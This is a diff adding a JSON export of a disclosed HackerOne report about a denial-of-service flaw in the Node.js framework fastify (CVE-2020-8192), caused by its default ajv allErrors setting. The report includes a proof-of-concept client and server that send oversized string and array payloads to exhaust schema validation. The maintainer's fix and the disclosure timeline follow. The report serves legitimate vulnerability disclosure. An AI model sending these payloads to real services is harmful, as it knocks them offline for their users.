@@ -1,0 +1,358 @@
+{
+  "id": 903521,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MDM1MjE=",
+  "url": "https://hackerone.com/reports/903521",
+  "title": "Fastify uses allErrors: true ajv configuration by default which is susceptible to DoS",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-06-20T04:51:56.346Z",
+  "submitted_at": "2020-06-20T04:51:56.346Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "chalker",
+    "url": "/chalker",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8192"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-07-29T12:53:44.132Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2020-06-29T12:53:38.922Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a denial of service vulnerability in fastify\nIt allows to cause a DoS with some schemas that were otherwise assumed to be secure against DoS by their authors\n\n# Module\n\n**module name:** fastify\n**version:** `2.14.1`, `3.0.0-rc.4`\n**npm page:** `https://www.npmjs.com/package/fastify`\n\n## Module Description\n\n> An efficient server implies a lower cost of the infrastructure, a better responsiveness under load and happy users. \n\n## Module Stats\n\n114 076 weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nSee <https://github.com/ajv-validator/ajv#security-risks-of-trusted-schemas>:\n\n> **Please note:** The suggestions above to prevent slow validation would only work if you do NOT use `allErrors: true` in production code (using it would continue validation after validation errors).\n\n`fastify` uses `allErrors: true` by default which makes it susceptible to DoS attacks even when schemas are otherwise safe.\n\nE.g. a (sub-)schema `{ uniqueItems: true, maxItems: 10 }` is otherwise safe against DoS as `maxItems` is checked **first** and validation fails there on long arrays, _but that applies to only not in `allErrors: true` case_. \n\nNeither https://github.com/fastify/fastify/blob/master/docs/Validation-and-Serialization.md nor https://github.com/fastify/fastify/blob/master/docs/Recommendations.md mentions this directly.\n\nIntroduced in https://github.com/fastify/fastify/pull/1398\n\n## Steps To Reproduce:\n\n```js\n/* Client */\n\nconst fetch = require('node-fetch')\nconst request = body => {\n  const json = JSON.stringify(body)\n  console.log(`Payload size: ${Math.round(json.length / 1024)} KiB`)\n  return fetch('http://127.0.0.1:3000/', {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    },\n    body: json\n  })\n}\n\nconst fireRequests = async () => {\n  await request({ string: '@'.repeat(90000) })\n  await request({ array: Array(20000).fill().map(() => ({x: Math.random().toString(32).slice(2)})) })\n}\n\n/* Server */\n\nconst fastify = require('fastify')({ logger: true })\n\nconst schema = {\n  body: {\n    type: 'object',\n    properties: {\n      array: { uniqueItems: true, maxItems: 10 },\n      string: { pattern: \"^[^/]+@.+#$\", maxLength: 20 },\n    }\n  },\n}\n\nfastify.post('/', { schema }, (request, reply) => {\n  reply.send({ hello: 'world', body: request.body })\n})\n\nfastify.listen(3000, (err, address) => {\n  fastify.log.info(`server listening on ${address}`)\n  fireRequests()\n})\n```\n\nhttps://gist.github.com/ChALkeR/15e758d3fc5cbba0840b6a03a070c838\n\n## Patch\n\nRevert https://github.com/fastify/fastify/pull/1398\n\n## Work-around\n\nUse https://github.com/fastify/fastify/blob/master/docs/Server.md#ajv to override `allErrors` to `false` in ajv configuration.\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nCause DoS in a presence of potentially slow pattern / format or `uniqueItems` in the schema, even when schema author guarded that with a length check to be otherwise immune to DoS.",
+  "bounty_amount": "250.0",
+  "formatted_bounty": "$250",
+  "weakness": {
+    "id": 48,
+    "name": "Denial of Service"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+
+  ],
+  "allow_singular_disclosure_at": "2020-07-29T12:53:39.024Z",
+  "allow_singular_disclosure_after": -99426747.47048679,
+  "singular_disclosure_allowed": true,
+  "vote_count": 4,
+  "voters": [
+    "bl4de",
+    "ali",
+    "donotenter",
+    "listan_kuy21"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 5.3,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 4647,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "fastify",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 8348971,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Welp, cant fix mistypes in the text after sending, hope that doesn't matter much :-).",
+      "automated_response": false,
+      "created_at": "2020-06-20T04:54:28.326Z",
+      "updated_at": "2020-06-20T04:54:28.326Z",
+      "actor": {
+        "username": "chalker",
+        "cleared": false,
+        "verified": false,
+        "url": "/chalker",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8350209,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Confirmed! I'm working on a patch.",
+      "automated_response": false,
+      "created_at": "2020-06-20T08:39:03.872Z",
+      "updated_at": "2020-06-20T08:39:03.872Z",
+      "actor": {
+        "username": "mcollina",
+        "cleared": false,
+        "verified": false,
+        "url": "/mcollina",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8350946,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Unfortunately said note about `allErrors` was added in https://github.com/ajv-validator/ajv/commit/334071a380c37e4d24b37de79e7ed7cc4c63a7e5, just a few days _after_ https://github.com/fastify/fastify/pull/1398. I even thought it could have been problematic.",
+      "automated_response": false,
+      "created_at": "2020-06-20T09:11:56.036Z",
+      "updated_at": "2020-06-20T09:11:56.036Z",
+      "actor": {
+        "username": "mcollina",
+        "cleared": false,
+        "verified": false,
+        "url": "/mcollina",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8351153,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ExternalUserJoined",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-06-20T09:45:52.102Z",
+      "updated_at": "2020-06-20T09:45:52.102Z",
+      "actor": {
+        "username": "delvedor",
+        "cleared": false,
+        "verified": false,
+        "url": "/delvedor",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y63cf8f9mq6rwyf1t3ki58b5v9wx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22T0CUZ52US-UC6MMM010-2e8a86c8ea51-512.jpg%22%3B%20filename%2A%3DUTF-8%27%27T0CUZ52US-UC6MMM010-2e8a86c8ea51-512.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJ65FZXU%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072606Z&X-Amz-Expires=1007&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQC13hGRnFPG%2F8PgGnjUyc6RI7lGqUkEmr5u8l5tIeU95QIhAJgg%2FXv6bUcqZ%2FSQC3RBLq7QXM%2FDN5dN3fmku2DEJLRYKrEFCCIQAxoMMDEzNjE5Mjc0ODQ5IgwwR6BVchZWZB1Ys8gqjgXWndmoLAPy6R6rOiASV6IYlCP1ezRaoIE9cgpZaMh%2BiDDyY22Id0kBwojlWW5TCy0oa17lVogIDNmlFMqIVN%2B2ieEOvRZB5BfofcdU4BRMQZobwebNU8U1u3z41pIbGrJ8z%2BD0M%2Bc3SExuepKl5kYwdxZUR3hRtqNEHS3wi9wFG1K55iEbkL8Z3%2FoeDgRA22vZLRT5%2Bfi8q5HN8wvWzeykQCs0lZ6PGAtuDC4GQ5dWmIVTVMNHx%2BHghUQIkfRiOCKLPdo1raL2z7hgrjkg9uzJ4JgHmVEXG%2BfUy7TYArAV%2FtaI4Vuk84onY9eYDjkRB4zCzNIDQEo2kQwFwon6IGIlWBgkVOO37ud5VNRp8NAt6xYzLVfR4qqbMVMnI%2BosvqIcAHiFOzs3eIqnCwzxnzOIqBtb9nvaev20H7dwAwrDoZoC2%2F9wqlTsldSl5EG76v8wCqYamXzWGsuilXt7wv8WwkAk9T553W2a%2B%2BfbsOgcFxSDDddQthDfGf74LDgvOb2WozDHRrLqsR6nJI76RIWLp1hA7eMvpy0gbrQPL19HvpjW9v9tulbIvFTeLguNOKjDBVTAfnJlwD5bISU0b3yinZhtA5cY6tmAv6r7GmVpVWrt66HzOIXW%2FhVM%2F%2B5a%2FR0ODLBMT569ATPEQNgL4OHbeE3fIWxzKiYS9vkDpQz2rAIST4aZTgwC253Ne3n%2FQrG%2B%2F%2B6UQZToMCs8RqF8WRXxfqW7abs4O3ZdrFKESqBFCpPJqUmgXkC67%2BQe35GJARmHz3%2FPH8lntEuX7Bf05Bji8vQCcT1mKCa2fcjqum%2B4rPEDglldLO90UMUUpktIwyKeG4i28osTzPFt1bAltrxqk8wrGuHdPtH7UPAddVEws%2Fm4qAY6sAHJcQAAHMEwHyUT%2B5pz47K2QtFkvJobeZlnKje2WF01wKCRmG2EyJnjOuCSI1K1aNlscisHQeA%2BSqBbWlLVKvLfdeB5Crp92OpeBOmAr1E13T72GcQLOwgGuTXFm8usje4Kh0GfIMl9shrEXw%2FQ1KpNchynhcV7QXLnKks3QIlRuBPhV8TVc9%2Fc7lZvke2E%2BkbhPQTqoPojsquSawR0K1xO9a99vuPUGcyN7Vkh00vEhA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=65bed1eac0469171613b06b0b659d438a189a6b71dc2457e7b2ca6aebe256433"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8353739,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ExternalUserJoined",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-06-20T10:42:12.063Z",
+      "updated_at": "2020-06-20T10:42:12.063Z",
+      "actor": {
+        "username": "eomm",
+        "cleared": false,
+        "verified": false,
+        "url": "/eomm",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/EKfxxT733i2vZwAYZs8xpMaZ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8443472,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "I've released v2.15.1 and v3.0.0-rc.5 with the fix.\n\nhttps://github.com/fastify/fastify/releases/tag/v2.15.1\nhttps://github.com/fastify/fastify/releases/tag/v3.0.0-rc.5",
+      "automated_response": false,
+      "created_at": "2020-06-29T12:50:50.071Z",
+      "updated_at": "2020-06-29T12:50:50.071Z",
+      "actor": {
+        "username": "mcollina",
+        "cleared": false,
+        "verified": false,
+        "url": "/mcollina",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "chalker",
+        "url": "/chalker"
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8443476,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-06-29T12:51:03.501Z",
+      "updated_at": "2020-06-29T12:51:03.501Z",
+      "actor": {
+        "url": "/nodejs-ecosystem",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Node.js third-party modules"
+        }
+      },
+      "bounty_amount": "250.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem",
+      "collaborator": {
+        "username": "chalker",
+        "url": "/chalker"
+      }
+    },
+    {
+      "id": 8443505,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-06-29T12:53:38.947Z",
+      "updated_at": "2020-06-29T12:53:38.947Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "mcollina",
+        "cleared": false,
+        "verified": false,
+        "url": "/mcollina",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8792098,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-07-29T12:53:44.186Z",
+      "updated_at": "2020-07-29T12:53:44.186Z",
+      "actor": {
+        "url": "/nodejs-ecosystem",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Node.js third-party modules"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
